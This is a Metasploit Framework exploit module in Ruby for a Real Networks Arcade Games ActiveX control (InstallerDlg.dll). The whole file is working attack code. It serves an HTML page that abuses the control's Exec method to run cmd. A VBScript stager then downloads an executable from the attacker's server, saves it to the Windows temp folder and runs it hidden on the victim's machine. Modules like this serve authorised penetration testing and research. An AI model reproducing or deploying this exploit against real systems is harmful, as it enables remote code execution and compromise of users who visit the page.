##
# $Id: real_arcade_installerdlg.rb 12286 2011-04-09 18:24:43Z sinn3r $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::EXE

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Real Networks Arcade Games StubbyUtil.ProcessMgr ActiveX Arbitrary Code Execution',
			'Description'    => %q{
					This module exploits a vulnerability in Real Networks Acrade Game's ActiveX control. The "exec"
				function found in InstallerDlg.dll (v2.6.0.445) allows remote attackers to run arbitrary commands
				on the victim machine.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
					[
						'rgod',    #Initial discovery, poc
						'sinn3r',  #msf
					],
			'Version'        => '$Revision: 12286 $',
			'References'     =>
				[
					[ 'OSVDB', '71559' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/17105/' ]
				],
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x00",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows Universal',  {} ],
				],
			'DisclosureDate' => 'Apri 3 2011',
			'DefaultTarget'  => 0))
	end

	# Unfortunately if we echo the vbs cmdstager too many times, we tend to have random missing lines in
	# either the payload or the vbs script.  To avoid this problem, I ended up writing this custom routine
	# that only uses one echo.
	def build_vbs(url, payload_name, stager_name)
		name_xmlhttp = rand_text_alpha(2)
		name_adodb   = rand_text_alpha(2)

		tmp = "#{@temp_folder}/#{stager_name}"

		vbs  = "echo Set #{name_xmlhttp} = CreateObject(\"\"Microsoft.XMLHTTP\"\") "
		vbs << ": #{name_xmlhttp}.open \"\"GET\"\",\"\"http://#{url}\"\",False : #{name_xmlhttp}.send"
		vbs << ": Set #{name_adodb} = CreateObject(\"\"ADODB.Stream\"\") "
		vbs << ": #{name_adodb}.Open : #{name_adodb}.Type=1 "
		vbs << ": #{name_adodb}.Write #{name_xmlhttp}.responseBody "
		vbs << ": #{name_adodb}.SaveToFile \"\"#{@temp_folder}/#{payload_name}.exe\"\",2 "
		vbs << ": CreateObject(\"\"WScript.Shell\"\").Run \"\"#{@temp_folder}/#{payload_name}.exe\"\",0 >> #{tmp}"

		return vbs
	end

	def exploit
		@payload_name = rand_text_alpha(4)
		@temp_folder  = "C:/Windows/Temp"
		super
	end

	def on_request_uri(cli, request)
		if request.uri =~ /\.exe/
			print_status("Sending payload to #{cli.peerhost}:#{cli.peerport}...")
			return if ((p=regenerate_payload(cli)) == nil)
			data = generate_payload_exe( {:code=>p.encoded} )
			send_response(cli, data, {'Content-Type' => 'application/octet-stream'} )
			return
		end

		# Payload's URL
		payload_src  = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
		payload_src << ":" << datastore['SRVPORT'] << get_resource() + "/" + @payload_name + ".exe"

		# Create the stager (download + execute payload)
		stager_name = rand_text_alpha(6) + ".vbs"
		stager      = build_vbs(payload_src, @payload_name, stager_name)

		html_obj_name = rand_text_alpha(6)

		html = <<-EOS
		<html>
		<object classid='clsid:5818813E-D53D-47A5-ABBB-37E2A07056B5' id='#{html_obj_name}' />
		</object>
		<script language='vbscript'>
		#{html_obj_name}.Exec "cmd","/c #{stager}",1,1,""
		setTimeout "x=1", 3000
		#{html_obj_name}.Exec "cmd","/c start #{@temp_folder}/#{stager_name}",1,1,""
		</script>
		</html>
		EOS

		# Remove extra tabs
		html = html.gsub(/^\t\t/, "")

		print_status("Sending HTML to #{cli.peerhost}:#{cli.peerport}...")
		send_response(cli, html, { 'Content-Type' => 'text/html' })
	end
end